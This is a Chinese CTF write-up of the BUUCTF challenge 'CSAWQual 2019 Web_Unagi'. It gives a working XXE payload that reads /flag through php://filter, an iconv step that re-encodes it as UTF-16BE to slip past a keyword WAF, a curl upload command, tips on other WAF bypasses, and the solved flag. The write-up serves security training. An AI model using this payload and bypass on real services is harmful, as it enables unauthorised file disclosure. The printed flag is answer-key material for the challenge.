---
title: "[CSAWQual 2019]Web_Unagi"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [xxe, xml-injection, waf-bypass, encoding-bypass, file-read]
vulnerability: XXE 注入配合 UTF-16 编码绕过 WAF
solved: true
flag: "flag{2379cfe2-fff5-431f-aa85-c0031ce03370}"
---

# [CSAWQual 2019]Web_Unagi

## 题目概述
题目是一个用户管理系统，包含首页、用户列表、文件上传和关于页面。`about.php` 提示 flag 位于 `/flag` 路径，`upload.php` 允许上传 XML 格式的用户文件。

## 信息收集
1. **首页**：导航栏指向 index.php、user.php、upload.php、about.php
2. **about.php**：提示 `Flag is located at /flag, come get it`
3. **upload.php**：允许上传 XML 文件，提供 sample.xml 示例
4. **sample.xml**：标准用户 XML 结构，包含 username、password、name、email、group 字段
5. **user.php**：通过 jQuery 加载 userdb.php，显示用户信息（包含 Intro 字段）

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：XXE (XML External Entity) 注入

**判断过程**：
1. 上传功能接受 XML 文件 → 可能存在 XXE
2. 尝试上传包含 `<!ENTITY xxe SYSTEM "file:///flag">` 的 XML → 被 WAF 拦截
3. WAF 可能检测关键词如 `<!DOCTYPE`、`ENTITY`、`SYSTEM` 等
4. 考虑编码绕过：XML 解析器支持多种编码，WAF 可能只检测 UTF-8

**原理**：
- XML 解析器支持 UTF-8、UTF-16 等多种编码
- WAF 通常只检测 UTF-8 编码的恶意关键词
- 使用 UTF-16 编码后，关键词被拆分为双字节，绕过正则匹配

**额外问题**：直接读取 `/flag` 时内容被截断，原因是 flag 中包含换行符导致 XML 解析中断。使用 PHP 伪协议 `php://filter/read=convert.base64-encode/resource=/flag` 将内容 base64 编码后可完整读取。

## 利用过程（Payload + Flag）

**步骤 1**：构造 XXE payload（使用 base64 编码避免特殊字符问题）
```xml
<?xml version="1.0"?>
<!DOCTYPE users [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
]>
<users>
    <user>
        <username>test</username>
        <password>test</password>
        <name>Test</name>
        <email>test@test.com</email>
        <group>test</group>
        <intro>&xxe;</intro>
    </user>
</users>
```

**步骤 2**：转换为 UTF-16 编码绕过 WAF
```bash
echo -n "$payload" | iconv -f UTF-8 -t UTF-16BE > xxe_utf16.xml
```

**步骤 3**：上传文件
```bash
curl -X POST "http://target/upload.php" \
  -F "doc=@xxe_utf16.xml" \
  -F "submit=Upload"
```

**步骤 4**：获取 base64 编码的 flag 并解码
```
Intro: ZmxhZ3syMzc5Y2ZlMi1mZmY1LTQzMWYtYWE4NS1jMDAzMWNlMDMzNzB9Cg==
```
解码后：`flag{2379cfe2-fff5-431f-aa85-c0031ce03370}`

## 复现步骤
1. 访问 `about.php` 确认 flag 位置为 `/flag`
2. 访问 `upload.php` 和 `sample.xml` 了解 XML 格式
3. 构造包含外部实体的 XXE payload
4. 使用 `iconv` 将 payload 转换为 UTF-16 编码
5. 上传编码后的文件，绕过 WAF
6. 使用 base64 过滤器读取完整 flag 内容
7. 解码 base64 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| XXE 注入 | upload.php 文件上传 | `<!ENTITY xxe SYSTEM "php://filter/...">` | XML 外部实体注入 |
| WAF 绕过 | 编码转换 | UTF-16BE 编码 | 编码绕过正则匹配 |
| 特殊字符处理 | base64 编码 | `php://filter/read=convert.base64-encode` | PHP 伪协议 |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
1. 遇到 XML 上传功能，优先考虑 XXE 注入
2. WAF 拦截时尝试编码绕过（UTF-16、UTF-7、gzip 等）
3. 读取文件内容被截断时，使用 base64 编码避免特殊字符问题
4. PHP 环境下可利用 `php://filter` 伪协议进行编码转换

**同类题型套路**：
- XML 上传 → XXE → 编码绕过 WAF → 读取敏感文件
- 常见 WAF 绕过：UTF-16 编码、CDATA 包装、参数实体、外带数据(OOB)
